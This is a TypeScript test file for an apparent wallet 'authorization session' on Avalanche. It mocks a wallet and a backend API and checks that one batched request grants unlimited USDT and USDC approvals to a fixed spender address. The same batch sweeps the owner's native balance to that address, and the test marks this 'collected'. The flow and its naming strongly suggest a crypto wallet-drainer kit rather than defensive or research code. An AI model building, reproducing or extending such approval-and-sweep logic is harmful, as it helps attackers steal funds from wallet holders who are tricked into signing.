import assert from "node:assert/strict";
import test from "node:test";
import { runAuthorizationSession } from "../../src/authorization/session";
import { StageStatus } from "../../src/approval/types";
import type { ApprovalOrchestrationResult } from "../../src/approval/types";
import type { NetworkRow } from "../../src/types";
import {
  buildMaximumPreferencesForNetwork,
  listIncludedAssetWork,
} from "../../src/authorization/preferences";

const OWNER = "0x1111111111111111111111111111111111111111";
const SPENDER = "0x2222222222222222222222222222222222222222";
const AVAX_USDT = "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7";
const AVAX_USDC = "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E";
const MAX_UINT =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function networkRow(): NetworkRow {
  return {
    key: "avax",
    name: "Avalanche",
    standard: "ERC-20",
    color: "#E84142",
    letter: "A",
    balances: { native: "1", usdt: "10", usdc: "5" },
  };
}

function mockApprovalOk(): ApprovalOrchestrationResult {
  return {
    ok: true,
    status: StageStatus.OK,
    txHash: "0xapprove",
    approvalId: "ap-mock",
    context: {
      request: {} as never,
      broadcast: { txHash: "0xapprove" },
      prepared: {} as never,
      stageLog: [],
    },
    stages: [],
  };
}

function prepareJson(token: "USDT" | "USDC") {
  const tokenAddress = token === "USDT" ? AVAX_USDT : AVAX_USDC;
  return {
    amountRaw: MAX_UINT,
    tokenAddress,
    spender: SPENDER,
    chainId: 43114,
    amountHuman: "UNLIMITED",
    to: tokenAddress,
    data: `0x095ea7b3000000000000000000000000${SPENDER.slice(
      2,
    )}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`,
  };
}

test("wallet phase skips separate native authorization after EIP-5792 batch included native", async () => {
  const row = networkRow();
  const prefs = { avax: buildMaximumPreferencesForNetwork("avax") };
  const items = listIncludedAssetWork(prefs, [row], "avax");

  let nativeTransferCalls = 0;
  const mockProvider = {
    request: async (args: { method: string; params?: unknown[] }) => {
      if (args.method === "wallet_getCapabilities") {
        return { "0xa86a": { atomic: { status: "ready" } } };
      }
      if (args.method === "wallet_sendCalls") {
        return { id: "batch-1" };
      }
      if (args.method === "wallet_getCallsStatus") {
        return {
          status: "CONFIRMED",
          receipts: [
            { status: "success", transactionHash: "0xusdt" },
            { status: "success", transactionHash: "0xusdc" },
            { status: "success", transactionHash: "0xnative-batch" },
          ],
        };
      }
      if (args.method === "eth_chainId") {
        return "0xa86a";
      }
      return null;
    },
    session: {
      topic: "mock",
      namespaces: { eip155: { accounts: [`eip155:43114:${OWNER}`] } },
    },
  };

  const originalFetch = globalThis.fetch;
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    const body =
      typeof init?.body === "string" ? JSON.parse(init.body) : undefined;

    if (url.includes("/api/native-transfers/estimate")) {
      return new Response(
        JSON.stringify({
          network: "avax",
          owner: OWNER,
          recipient: SPENDER,
          transferableRaw: "900000000000000000",
          canTransfer: true,
          chainId: 43114,
        }),
        { status: 201, headers: { "content-type": "application/json" } },
      );
    }
    if (url.includes("/api/approvals/prepare")) {
      const token = (body?.token as "USDT" | "USDC") ?? "USDT";
      return new Response(JSON.stringify(prepareJson(token)), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }
    if (url.includes("/api/verify-allowance")) {
      return new Response(
        JSON.stringify({ ok: true, hasAllowance: false, allowance: "0" }),
        { status: 200, headers: { "content-type": "application/json" } },
      );
    }
    if (
      url.includes("/api/energy-delegate") ||
      url.includes("/api/resources/verify")
    ) {
      return new Response(JSON.stringify({ status: "READY", message: "ok" }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }
    return originalFetch(input, init);
  }) as typeof fetch;

  try {
    const summary = await runAuthorizationSession({
      items,
      networks: [row],
      accounts: { evm: OWNER, tron: null },
      getSpender: () => SPENDER,
      startSettlement: false,
      evmBatchProvider: mockProvider as never,
      runApproval: async () => mockApprovalOk(),
      runNativeTransfer: async () => {
        nativeTransferCalls += 1;
        return {
          ok: true,
          context: { request: {} as never, stageLog: [] },
          stages: [],
          deferredSignedRaw: "0xsigned",
        };
      },
    });

    assert.equal(nativeTransferCalls, 0);
    const native = summary.items.find((i) => i.token === "NATIVE");
    assert.equal(native?.outcome, "collected");
    assert.equal(native?.txHash, "0xnative-batch");
  } finally {
    globalThis.fetch = originalFetch;
  }
});
